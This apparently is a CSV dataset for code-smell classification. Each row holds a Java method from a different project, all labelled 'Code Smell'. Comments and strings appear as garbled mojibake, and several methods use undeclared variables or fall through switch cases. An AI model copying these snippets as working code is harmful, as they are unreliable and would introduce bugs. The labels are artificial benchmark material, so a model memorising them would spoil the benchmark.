text,label,text_label
"/** 
 * 楂橀搧鍟嗗姟搴ф槸鍚﹀瓨鍦ㄦ鏌ユ柟娉�
 * @param key              缂撳瓨Key
 * @param convert          搴т綅缁熻Map
 * @param distributedCache 鍒嗗竷寮忕紦瀛樻帴鍙�
 * @return 鍒ゆ柇搴т綅鏄惁瀛樺湪 true or false
 */
@Override public boolean checkSeat(final String key,HashMap<Integer,Integer> convert,DistributedCache distributedCache){
  boolean flag=false;
  ValueOperations<String,String> opsForValue=((StringRedisTemplate)distributedCache.getInstance()).opsForValue();
  AtomicInteger matchCount=new AtomicInteger(0);
  for (int i=0; i < 3; i++) {
    int cnt=0;
    if (convert.containsKey(i)) {
      for (int j=0; j < 2; j++) {
        Boolean bit=opsForValue.getBit(key,i + j * 3);
        if (null != bit && bit) {
          cnt=cnt + 1;
        }
        if (cnt == convert.get(i)) {
          matchCount.getAndIncrement();
          break;
        }
      }
      if (cnt != convert.get(i)) {
        break;
      }
    }
    if (matchCount.get() == convert.size()) {
      flag=true;
      break;
    }
  }
  return flag;
}",1,Code Smell
"private void onTickPlay(){
  Collection<Note> notes=song.getNotesMap().get(this.currentTick);
  if (!notes.isEmpty()) {
    if (autoRotate.get()) {
      Optional<Note> firstNote=notes.stream().findFirst();
      if (firstNote.isPresent()) {
        BlockPos firstPos=noteBlockPositions.get(firstNote.get());
        if (firstPos != null) {
          Rotations.rotate(Rotations.getYaw(firstPos),Rotations.getPitch(firstPos));
        }
      }
    }
    if (swingArm.get()) {
      mc.player.swingHand(Hand.MAIN_HAND);
    }
    for (    Note note : notes) {
      BlockPos pos=noteBlockPositions.get(note);
      if (pos == null) {
        return;
      }
      if (polyphonic.get()) {
        playRotate(pos);
      }
 else {
        this.playRotate(pos);
      }
    }
  }
}
",1,Code Smell
"public ExcelFileData excelUpload(@RequestParam(""file"") MultipartFile file,@RequestParam(""id"") long datasourceId,@RequestParam(""editType"") Integer editType) throws DEException {
  ExcelUtils excelUtils=new ExcelUtils();
  ExcelFileData excelFileData=excelUtils.excelSaveAndParse(file);
  if (editType == 1 || editType == 0) {
    CoreDatasource coreDatasource=datasourceMapper.selectById(datasourceId);
    if (coreDatasource != null) {
      DatasourceRequest datasourceRequest=new DatasourceRequest();
      datasourceRequest.setDatasource(coreDatasource);
      List<DatasetTableDTO> datasetTableDTOS=ExcelUtils.getTables(datasourceRequest);
      List<ExcelSheetData> excelSheetDataList=new ArrayList<>();
      for (      ExcelSheetData sheet : excelFileData.getSheets()) {
        for (        DatasetTableDTO datasetTableDTO : datasetTableDTOS) {
          if (excelDataTableName(datasetTableDTO.getTableName()).equals(sheet.getTableName()) || isCsv(file.getOriginalFilename())) {
            List<String> fieldNames=sheet.getFields().stream().map(TableField::getName).collect(Collectors.toList());
            List<String> fieldTypes=sheet.getFields().stream().map(TableField::getFieldType).collect(Collectors.toList());
            Collections.sort(fieldNames);
            Collections.sort(fieldTypes);
            datasourceRequest.setTable(datasetTableDTO.getTableName());
            List<String> oldFieldNames=ExcelUtils.getTableFields(datasourceRequest).stream().map(TableField::getName).collect(Collectors.toList());
            List<String> oldFieldTypes=ExcelUtils.getTableFields(datasourceRequest).stream().map(TableField::getFieldType).collect(Collectors.toList());
            Collections.sort(oldFieldNames);
            Collections.sort(oldFieldTypes);
            if (fieldNames.equals(oldFieldNames) && fieldTypes.equals(oldFieldTypes)) {
              sheet.setDeTableName(datasetTableDTO.getTableName());
              excelSheetDataList.add(sheet);
            }
          }
        }
      }
      if (CollectionUtils.isEmpty(excelSheetDataList) || excelSheetDataList.size() != datasetTableDTOS.size()) {
        DEException.throwException(""涓婁紶鏂囦欢涓庢簮鏂囦欢涓嶄竴鑷达紝璇锋鏌ユ枃浠�!"");
      }
      excelFileData.setSheets(excelSheetDataList);
    }
  }
  for (  ExcelSheetData sheet : excelFileData.getSheets()) {
    for (int i=0; i < sheet.getFields().size() - 1; i++) {
      for (int j=i + 1; j < sheet.getFields().size(); j++) {
        if (sheet.getFields().get(i).getName().equalsIgnoreCase(sheet.getFields().get(j).getName())) {
          DEException.throwException(sheet.getExcelLabel() + Translator.get(""i18n_field_name_repeat"") + sheet.getFields().get(i).getName());
        }
      }
    }
  }
  return excelFileData;
}",1,Code Smell
"/** 
 * Note this method has assumption that item is filled either in the same row next row of last item.  Search until row index wrapped.
 */
@Override public int findRowMin(boolean findLarge,int indexLimit,int[] indices){
  int value;
  int edge=mProvider.getEdge(indexLimit);
  Location loc=getLocation(indexLimit);
  int row=loc.row;
  int index=indexLimit;
  int visitedRows=1;
  int visitRow=row;
  if (mReversedFlow) {
    value=edge - mProvider.getSize(indexLimit);
    for (int i=indexLimit - 1; visitedRows < mNumRows && i >= mFirstVisibleIndex; i--) {
      edge-=loc.offset;
      loc=getLocation(i);
      if (loc.row != visitRow) {
        visitRow=loc.row;
        visitedRows++;
        int newValue=edge - mProvider.getSize(i);
        if (findLarge ? newValue > value : newValue < value) {
          value=newValue;
          row=visitRow;
          index=i;
        }
      }
    }
  }
 else {
    value=edge;
    for (int i=indexLimit + 1; visitedRows < mNumRows && i <= mLastVisibleIndex; i++) {
      loc=getLocation(i);
      edge+=loc.offset;
      if (loc.row != visitRow) {
        visitRow=loc.row;
        visitedRows++;
        if (findLarge ? edge > value : edge < value) {
          value=edge;
          row=visitRow;
          index=i;
        }
      }
    }
  }
  if (indices != null) {
    indices[0]=row;
    indices[1]=index;
  }
  return value;
}",1,Code Smell
"@Override public String getString(ResultSet rs,int index,boolean limitSize) throws SQLException {
  Object obj=rs.getObject(index);
  if (obj == null) {
    return null;
  }
  try {
    if (obj instanceof BigDecimal) {
      return bigDecimal.toPlainString();
    }
 else     if (obj instanceof Double) {
      return BigDecimal.valueOf(d).toPlainString();
    }
 else     if (obj instanceof Float) {
      return BigDecimal.valueOf(f).toPlainString();
    }
 else     if (obj instanceof Clob) {
      return largeString(rs,index,limitSize);
    }
 else     if (obj instanceof byte[]) {
      return largeString(rs,index,limitSize);
    }
 else     if (obj instanceof Blob) {
      return largeStringBlob(blob,limitSize);
    }
 else     if (obj instanceof Timestamp || obj instanceof LocalDateTime) {
      return largeTime(obj);
    }
 else {
      return obj.toString();
    }
  }
 catch (  Exception e) {
    log.warn(""Failed to parse number:{},{}"",index,obj,e);
    return obj.toString();
  }
}
",1,Code Smell
"private void read() throws IOException {
  int pos=0;
  ArrayList<HashMap<Integer,Double>> processedData=new ArrayList<>();
  ArrayList<String> labels=new ArrayList<>();
  String line;
  try (BufferedReader r=new BufferedReader(new InputStreamReader(url.openStream(),StandardCharsets.UTF_8))){
    for (; ; ) {
      line=r.readLine();
      if (line == null) {
        break;
      }
      pos++;
      String[] fields=splitPattern.split(line);
      try {
        boolean valid=true;
        HashMap<Integer,Double> features=new HashMap<>();
        for (int i=1; i < fields.length && valid; i++) {
          int ind=fields[i].indexOf(':');
          if (ind < 0) {
            logger.warning(String.format(""Weird line at %d"",pos));
            valid=false;
          }
          String ids=fields[i].substring(0,ind);
          int id=Integer.parseInt(ids);
          if ((!rangeSet) && (maxFeatureID < id)) {
            maxFeatureID=id;
          }
          if ((!rangeSet) && (minFeatureID > id)) {
            minFeatureID=id;
          }
          double val=Double.parseDouble(fields[i].substring(ind + 1));
          Double value=features.put(id,val);
          if (value != null) {
            logger.warning(String.format(""Repeated features at line %d"",pos));
            valid=false;
          }
        }
        if (valid) {
          labels.add(fields[0]);
          processedData.add(features);
        }
 else {
          throw new IOException(""Invalid LibSVM format file"");
        }
      }
 catch (      NumberFormatException ex) {
        logger.warning(String.format(""Weird line at %d"",pos));
        throw new IOException(""Invalid LibSVM format file"",ex);
      }
    }
  }
   int width=("""" + maxFeatureID).length();
  String formatString=""%0"" + width + ""d"";
  int maxID=maxFeatureID;
  if (minFeatureID != 0) {
    minFeatureID=1;
    zeroIndexed=false;
  }
 else {
    maxID++;
    zeroIndexed=true;
  }
  String[] featureNames=new String[maxID];
  for (int i=0; i < maxID; i++) {
    featureNames[i]=String.format(formatString,i);
  }
  ArrayList<Feature> buffer=new ArrayList<>();
  for (int i=0; i < processedData.size(); i++) {
    String labelStr=labels.get(i);
    HashMap<Integer,Double> features=processedData.get(i);
    try {
      T curLabel=outputFactory.generateOutput(labelStr);
      ArrayExample<T> example=new ArrayExample<>(curLabel);
      buffer.clear();
      for (      Map.Entry<Integer,Double> e : features.entrySet()) {
        int id=e.getKey() - minFeatureID;
        if (id < maxID) {
          double value=e.getValue();
          Feature f=new Feature(featureNames[id],value);
          buffer.add(f);
        }
      }
      example.addAll(buffer);
      data.add(example);
    }
 catch (    NumberFormatException e) {
      logger.warning(String.format(""Failed to parse example %d"",i));
      throw new IOException(""Invalid LibSVM format file"");
    }
  }
}",1,Code Smell
"private void dfs(Node startNode){
  Deque<Node> stack=new ArrayDeque<>();
  stack.push(startNode);
  while (!stack.isEmpty()) {
    Node node=stack.pop();
    if (visitedNodes.contains(node)) {
      continue;
    }
    logger.trace(""dfs on {}"",node);
    visitedNodes.add(node);
    if (node instanceof VarNode) {
      Var var=varNode.getVar();
      Set<Obj> varPts=pta.getBase().getPointsToSet(var);
      getReturnToVariablesOf(var).forEach(toVar -> {
        VarNode toNode=ofg.getVarNode(toVar);
        if (toNode != null && outNodes.contains(toNode)) {
          for (          VarNode inNode : inNodes) {
            Var inVar=inNode.getVar();
            if (!Collections.disjoint(pta.getBase().getPointsToSet(inVar),varPts)) {
              wuEdges.put(node,new UnwrappedFlowEdge(node,toNode));
              break;
            }
          }
        }
      }
);
    }
    List<FlowEdge> nextEdges=new ArrayList<>();
    for (    FlowEdge edge : getOutEdgesOf(node)) {
switch (edge.kind()) {
case LOCAL_ASSIGN:
{
          nextEdges.add(edge);
        }
case INSTANCE_LOAD:
{
        VarNode toNode=(VarNode)edge.target();
        Var toVar=toNode.getVar();
        if (pce.pceMethodsOf(type).contains(toVar.getMethod())) {
          nextEdges.add(edge);
        }
      }
case INSTANCE_STORE:
{
      InstanceNode toNode=(InstanceNode)edge.target();
      Obj base=toNode.getBase();
      if (base.getType().equals(type)) {
        invokeMethods.stream().map(m -> m.getIR().getThis()).map(ofg::getVarNode).filter(Objects::nonNull).forEach(nextNode -> wuEdges.put(toNode,new WrappedFlowEdge(toNode,nextNode)));
        nextEdges.add(edge);
      }
 else       if (oag.getAllocateesOf(type).contains(base)) {
        VarNode assignedNode=getAssignedNode(base);
        if (assignedNode != null) {
          wuEdges.put(toNode,new WrappedFlowEdge(toNode,assignedNode));
        }
        nextEdges.add(edge);
      }
    }
case OTHER:
{
    if (edge instanceof WrappedFlowEdge) {
      VarNode toNode=(VarNode)edge.target();
      Var toVar=toNode.getVar();
      if (pce.pceMethodsOf(type).contains(toVar.getMethod())) {
        nextEdges.add(edge);
      }
    }
 else     if (edge instanceof UnwrappedFlowEdge) {
      nextEdges.add(edge);
    }
  }
}
}
for (FlowEdge nextEdge : nextEdges) {
stack.push(nextEdge.target());
}
}
}
",1,Code Smell
"public static int getProcessType(){
  if (mProcType != 0) {
    return mProcType;
  }
  String[] parts=getProcessName().split("":"");
  if (parts.length == 1) {
    if (""unknown"".equals(parts[0])) {
      return PROC_MAIN;
    }
 else     if (""com.tencent.ilink.ServiceProcess"".equals(parts[0])) {
      mProcType=PROC_OTHERS;
    }
 else {
      mProcType=PROC_MAIN;
    }
  }
 else {
    String tail=parts[parts.length - 1];
    if (""MSF"".equals(tail)) {
      mProcType=PROC_MSF;
    }
 else     if (""peak"".equals(tail)) {
      mProcType=PROC_PEAK;
    }
 else     if (""tool"".equals(tail)) {
      mProcType=PROC_TOOL;
    }
 else     if (tail.startsWith(""qzone"")) {
      mProcType=PROC_QZONE;
    }
 else     if (""video"".equals(tail)) {
      mProcType=PROC_VIDEO;
    }
 else     if (tail.startsWith(""mini"")) {
      mProcType=PROC_MINI;
    }
 else     if (tail.startsWith(""plugin"")) {
      mProcType=PROC_PLUGIN_PROCESS;
    }
 else     if (tail.startsWith(""troop"")) {
      mProcType=PROC_TROOP;
    }
 else     if (tail.startsWith(""unity"")) {
      mProcType=PROC_UNITY;
    }
 else     if (tail.startsWith(""wxa_container"")) {
      mProcType=PROC_WXA_CONTAINER;
    }
 else     if (tail.startsWith(""qqfav"")) {
      mProcType=PROC_QQFAV;
    }
 else {
      mProcType=PROC_OTHERS;
    }
  }
  return mProcType;
}",1,Code Smell
"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  cleanOrMigrateSettings();
  pIPUtils=PublicIPUtils.getInstance(getApplicationContext());
  setContentView(R.layout.activity_main);
  ImageView infoIcon=findViewById(R.id.info_icon);
  ImageView bugIcon=findViewById(R.id.bug_icon);
  ImageView settingsIcon=findViewById(R.id.setting_icon);
  FrameLayout switchButtonFrame=findViewById(R.id.switch_button_frame);
  switchButton=findViewById(R.id.switch_button);
  stateText=findViewById(R.id.state_text);
  publicIP=findViewById(R.id.publicIP);
  ipProgressBar=findViewById(R.id.ipProgressBar);
  infoIcon.setOnClickListener(v -> startActivity(new Intent(MainActivity.this,InfoActivity.class)));
  bugIcon.setOnClickListener(v -> startActivity(new Intent(MainActivity.this,BugActivity.class)));
  settingsIcon.setOnClickListener(v -> startActivity(new Intent(MainActivity.this,SettingsActivity.class)));
  switchButtonFrame.setOnClickListener(v -> switchButton.toggle());
  ActivityResultLauncher<Intent> vpnPermissionLauncher=registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),result -> {
    if (result.getResultCode() != RESULT_OK) {
      Toast.makeText(this,""Really!?"",Toast.LENGTH_LONG).show();
    }
    switchButton.setChecked(false);
  }
);
  switchButton.setOnCheckedChangeListener((view,isChecked) -> {
    if (!isChecked) {
      if (!lastKnownConnectionState.isDisconnected()) {
        OblivionVpnService.stopVpnService(this);
      }
      return;
    }
    Intent vpnIntent=OblivionVpnService.prepare(this);
    if (vpnIntent != null) {
      vpnPermissionLauncher.launch(vpnIntent);
      return;
    }
    if (lastKnownConnectionState.isDisconnected()) {
      OblivionVpnService.startVpnService(this);
    }
  }
);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
    ActivityResultLauncher<String> pushNotificationPermissionLauncher=registerForActivityResult(new ActivityResultContracts.RequestPermission(),isGranted -> {
      if (!isGranted) {
        Toast.makeText(this,""Permission denied"",Toast.LENGTH_LONG).show();
      }
    }
);
    pushNotificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS);
  }
  getOnBackPressedDispatcher().addCallback(this,new OnBackPressedCallback(true){
    @Override public void handleOnBackPressed(){
      if (backPressedTime + 2000 > System.currentTimeMillis()) {
        if (backToast != null)         backToast.cancel();
        finish();
      }
 else {
        if (backToast != null)         backToast.cancel();
        backToast=Toast.makeText(MainActivity.this,""亘乇丕蹖 禺乇賵噩貙 丿賵亘丕乇賴 亘丕夭诏卮鬲 乇丕 賮卮丕乇 丿賴蹖丿."",Toast.LENGTH_SHORT);
        backToast.show();
      }
      backPressedTime=System.currentTimeMillis();
    }
  }
);
}",1,Code Smell
"public boolean openPhotoForSelect(final ArrayList<Object> photos,final int index,int type,boolean documentsPicker,final PhotoViewerProvider provider,ChatActivity chatActivity){
  return openPhotoForSelect(null,null,photos,index,type,documentsPicker,provider,chatActivity);
}
public boolean openPhotoForSelect(final TLRPC.FileLocation fileLocation,final ImageLocation imageLocation,final ArrayList<Object> photos,final int index,int type,boolean documentsPicker,final PhotoViewerProvider provider,ChatActivity chatActivity){
  isDocumentsPicker=documentsPicker;
  if (pickerViewSendButton != null) {
    FrameLayout.LayoutParams layoutParams2=(FrameLayout.LayoutParams)pickerViewSendButton.getLayoutParams();
    if (type == 4 || type == 5) {
      pickerViewSendButton.setImageResource(R.drawable.msg_input_send_mini);
      layoutParams2.bottomMargin=dp(7.33f);
    }
 else     if (type == SELECT_TYPE_AVATAR || type == SELECT_TYPE_WALLPAPER || type == SELECT_TYPE_QR || type == SELECT_TYPE_STICKER) {
      pickerViewSendButton.setImageResource(R.drawable.floating_check);
      pickerViewSendButton.setPadding(0,dp(1),0,0);
      layoutParams2.bottomMargin=dp(7.33f);
    }
 else {
      pickerViewSendButton.setImageResource(R.drawable.msg_input_send_mini);
      layoutParams2.bottomMargin=dp(2.33f);
    }
    pickerViewSendButton.setLayoutParams(layoutParams2);
  }
  if (type != SELECT_TYPE_STICKER && stickerMakerView != null) {
    stickerEmpty=false;
    if (tuneItem != null) {
      tuneItem.setAlpha(1f);
    }
    if (outlineBtn != null)     outlineBtn.setActive(false,false);
    stickerMakerView.clean();
    if (selectedEmojis != null)     selectedEmojis.clear();
  }
  if (sendPhotoType != SELECT_TYPE_AVATAR && type == SELECT_TYPE_AVATAR && isVisible) {
    sendPhotoType=type;
    doneButtonPressed=false;
    actionBarContainer.setTitle("""");
    actionBarContainer.setSubtitle("""",false);
    placeProvider=provider;
    mergeDialogId=0;
    currentDialogId=0;
    selectedPhotosAdapter.notifyDataSetChanged();
    pageBlocksAdapter=null;
    if (velocityTracker == null) {
      velocityTracker=VelocityTracker.obtain();
    }
    isVisible=true;
    isVisibleOrAnimating=true;
    togglePhotosListView(false,false);
    openedFullScreenVideo=false;
    createCropView();
    toggleActionBar(false,false);
    seekToProgressPending2=0;
    skipFirstBufferingProgress=false;
    playerInjected=false;
    makeFocusable();
    backgroundDrawable.setAlpha(255);
    containerView.setAlpha(1.0f);
    onPhotoShow(null,fileLocation,imageLocation,null,null,null,photos,index,null);
    initCropView();
    setCropBitmap();
    return true;
  }
  sendPhotoType=type;
  if (sendPhotoType == SELECT_TYPE_STICKER) {
    navigationBar.setBackgroundColor(0xFF000000);
  }
  return openPhoto(null,fileLocation,imageLocation,null,null,null,photos,index,provider,chatActivity,0,0,0,true,null,null);
}",1,Code Smell
"@Override public void execute(@NonNull final LauncherAppState app,@NonNull final BgDataModel dataModel,@NonNull final AllAppsList apps){
  if (mInstallInfo.state == PackageInstallInfo.STATUS_INSTALLED) {
    try {
      ApplicationInfo ai=app.getContext().getPackageManager().getApplicationInfo(mInstallInfo.packageName,0);
      if (InstantAppResolver.newInstance(app.getContext()).isInstantApp(ai)) {
        app.getModel().onPackageAdded(ai.packageName,mInstallInfo.user);
      }
    }
 catch (    PackageManager.NameNotFoundException e) {
    }
    return;
  }
synchronized (apps) {
    List<AppInfo> updatedAppInfos=apps.updatePromiseInstallInfo(mInstallInfo);
    if (!updatedAppInfos.isEmpty()) {
      for (      AppInfo appInfo : updatedAppInfos) {
        scheduleCallbackTask(c -> c.bindIncrementalDownloadProgressUpdated(appInfo));
      }
    }
    bindApplicationsIfNeeded();
  }
synchronized (dataModel) {
    final HashSet<ItemInfo> updates=new HashSet<>();
    dataModel.forAllWorkspaceItemInfos(mInstallInfo.user,si -> {
      if (si.hasPromiseIconUi() && mInstallInfo.packageName.equals(si.getTargetPackage())) {
        si.setProgressLevel(mInstallInfo);
        updates.add(si);
      }
    }
);
    for (    LauncherAppWidgetInfo widget : dataModel.appWidgets) {
      if (widget.providerName.getPackageName().equals(mInstallInfo.packageName)) {
        widget.installProgress=mInstallInfo.progress;
        updates.add(widget);
      }
    }
    if (!updates.isEmpty()) {
      scheduleCallbackTask(callbacks -> callbacks.bindRestoreItemsChange(updates));
    }
  }
}",1,Code Smell
"public Hooklite(XC_LoadPackage.LoadPackageParam lpparam){
  XposedHelpers.findAndHookMethod(XposedHelpers.findClass(""com.netease.cloudmusic.NeteaseMusicApplication"",lpparam.classLoader),""attachBaseContext"",Context.class,new XC_MethodHook(){
    @Override protected void afterHookedMethod(    MethodHookParam param) throws Throwable {
      final Context context=(Context)param.thisObject;
      int versionCode=140;
      ExtraHelper.init(context);
      SettingHelper.init(context);
      final String processName=Tools.getCurrentProcessName(context);
      if (processName.equals(PACKAGE_NAME)) {
        new SettingHook(context,versionCode);
        if (!SettingHelper.getInstance().getSetting(SettingHelper.master_key))         return;
        new ProxyHook(context,false);
        if (SettingHelper.getInstance().isEnable(SettingHelper.black_key)) {
          new BlackHook(context,versionCode);
          deleteAdAndTinker();
        }
        new GrayHook(context);
        new AutoSignInHook(context,versionCode);
        new AdAndUpdateHook(context,versionCode);
        new MagiskFixHook(context);
        new InternalDialogHook(context,versionCode);
        ClassHelper.getCacheClassList(context,versionCode,() -> {
          new UserProfileHook(context);
          new EAPIHook(context);
          new DownloadMD5Hook(context);
          new HideTabHook(context,versionCode);
          new HideSidebarHook(context,versionCode);
          new HideBannerHook(context,versionCode);
          new HideBubbleHook(context);
          new CommentHotClickHook(context);
          new PlayerActivityHook(context,versionCode);
          new CdnHook(context,versionCode);
          mainProcessInit=true;
          if (mainProcessInit && playProcessInit)           context.sendBroadcast(new Intent(msg_hook_play_process));
        }
);
        IntentFilter intentFilter=new IntentFilter();
        intentFilter.addAction(msg_play_process_init_finish);
        intentFilter.addAction(msg_send_notification);
        context.registerReceiver(new BroadcastReceiver(){
          @Override public void onReceive(          Context c,          Intent intent){
            if (msg_play_process_init_finish.equals(intent.getAction())) {
              playProcessInit=true;
              if (mainProcessInit && playProcessInit)               context.sendBroadcast(new Intent(msg_hook_play_process));
            }
 else             if (msg_send_notification.equals(intent.getAction())) {
              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)               NotificationHelper.getInstance(context).sendUnLockNotification(context,intent.getIntExtra(""code"",0x10),intent.getStringExtra(""title""),intent.getStringExtra(""title""),intent.getStringExtra(""message""));
              XposedBridge.log(intent.getStringExtra(""title"") + ""锛�"" + intent.getStringExtra(""message""));
            }
          }
        }
,intentFilter);
      }
 else       if (processName.equals(PACKAGE_NAME + "":play"") && SettingHelper.getInstance().getSetting(SettingHelper.master_key)) {
        new ProxyHook(context,true);
        IntentFilter intentFilter=new IntentFilter();
        intentFilter.addAction(msg_hook_play_process);
        context.registerReceiver(new BroadcastReceiver(){
          @Override public void onReceive(          Context c,          Intent intent){
            if (msg_hook_play_process.equals(intent.getAction())) {
              ClassHelper.getCacheClassList(context,versionCode,() -> {
                new EAPIHook(context);
                new CdnHook(context,versionCode);
              }
);
            }
          }
        }
,intentFilter);
        context.sendBroadcast(new Intent(msg_play_process_init_finish));
      }
    }
  }
);
}",1,Code Smell
"@Override public J visitBlock(J.Block block,Integer p){
switch (loc) {
case BLOCK_END:
{
      if (block.isScope(insertionPoint)) {
        List<Statement> gen=substitutions.unsubstitute(templateParser.parseBlockStatements(new Cursor(getCursor(),insertionPoint),Statement.class,substitutedTemplate,loc,mode));
        if (coordinates.getComparator() != null) {
          J.Block b=block;
          for (          Statement g : gen) {
            b=b.withStatements(ListUtils.insertInOrder(block.getStatements(),autoFormat(g,p,getCursor()),getComparatorOrThrow()));
          }
          return b;
        }
        return block.withStatements(ListUtils.concatAll(block.getStatements(),ListUtils.map(gen,(i,s) -> autoFormat(s,p,getCursor()))));
      }
      break;
    }
case STATEMENT_PREFIX:
{
    return block.withStatements(ListUtils.flatMap(block.getStatements(),statement -> {
      if (statement.isScope(insertionPoint)) {
        List<Statement> gen=substitutions.unsubstitute(templateParser.parseBlockStatements(new Cursor(getCursor(),insertionPoint),Statement.class,substitutedTemplate,loc,mode));
        Cursor parent=getCursor();
        for (int i=0; i < gen.size(); i++) {
          Statement s=gen.get(i);
          Statement formattedS=autoFormat(i == 0 ? s.withPrefix(statement.getPrefix().withComments(emptyList())) : s,p,parent);
          gen.set(i,formattedS);
        }
switch (mode) {
case REPLACEMENT:
          return gen;
case BEFORE:
        return ListUtils.concat(gen,statement);
case AFTER:
      return ListUtils.concat(statement,gen);
  }
}
return statement;
}
));
}
}
return super.visitBlock(block,p);
}",1,Code Smell
"/** 
 * Put an entry on the output stream. This writes the entry's header record and positions the output stream for writing the contents of the entry. Once this method is called, the stream is ready for calls to write() to write the entry's contents. Once the contents are written, closeArchiveEntry() <B>MUST</B> be called to ensure that all buffered data is completely written to the output stream.
 * @param archiveEntry The TarEntry to be written to the archive.
 * @throws IOException on error
 * @throws ClassCastException if archiveEntry is not an instance of TarArchiveEntry
 * @throws IllegalArgumentException if the {@link TarArchiveOutputStream#longFileMode} equals{@link TarArchiveOutputStream#LONGFILE_ERROR} and the filename is too long
 * @throws IllegalArgumentException if the {@link TarArchiveOutputStream#bigNumberMode} equals{@link TarArchiveOutputStream#BIGNUMBER_ERROR} and one of the numeric valuesexceeds the limits of a traditional tar header.
 */
@Override public void putArchiveEntry(final ArchiveEntry archiveEntry) throws IOException {
  if (finished) {
    throw new IOException(""Stream has already been finished"");
  }
  final TarArchiveEntry entry=(TarArchiveEntry)archiveEntry;
  if (entry.isGlobalPaxHeader()) {
    final byte[] data=encodeExtendedPaxHeadersContents(entry.getExtraPaxHeaders());
    entry.setSize(data.length);
    entry.writeEntryHeader(recordBuf,zipEncoding,bigNumberMode == BIGNUMBER_STAR);
    writeRecord(recordBuf);
    currSize=entry.getSize();
    currBytes=0;
    this.haveUnclosedEntry=true;
    write(data);
    closeArchiveEntry();
  }
 else {
    final Map<String,String> paxHeaders=new HashMap<>();
    final String entryName=entry.getName();
    final boolean paxHeaderContainsPath=handleLongName(entry,entryName,paxHeaders,""path"",TarConstants.LF_GNUTYPE_LONGNAME,""file name"");
    final String linkName=entry.getLinkName();
    final boolean paxHeaderContainsLinkPath=linkName != null && !linkName.isEmpty() && handleLongName(entry,linkName,paxHeaders,""linkpath"",TarConstants.LF_GNUTYPE_LONGLINK,""link name"");
    if (bigNumberMode == BIGNUMBER_POSIX) {
      addPaxHeadersForBigNumbers(paxHeaders,entry);
    }
 else     if (bigNumberMode != BIGNUMBER_STAR) {
      failForBigNumbers(entry);
    }
    if (addPaxHeadersForNonAsciiNames && !paxHeaderContainsPath && !ASCII.canEncode(entryName)) {
      paxHeaders.put(""path"",entryName);
    }
    if (addPaxHeadersForNonAsciiNames && !paxHeaderContainsLinkPath && (entry.isLink() || entry.isSymbolicLink())&& !ASCII.canEncode(linkName)) {
      paxHeaders.put(""linkpath"",linkName);
    }
    paxHeaders.putAll(entry.getExtraPaxHeaders());
    if (!paxHeaders.isEmpty()) {
      writePaxHeaders(entry,entryName,paxHeaders);
    }
    entry.writeEntryHeader(recordBuf,zipEncoding,bigNumberMode == BIGNUMBER_STAR);
    writeRecord(recordBuf);
    currBytes=0;
    if (entry.isDirectory()) {
      currSize=0;
    }
 else {
      currSize=entry.getSize();
    }
    currName=entryName;
    haveUnclosedEntry=true;
  }
}",1,Code Smell
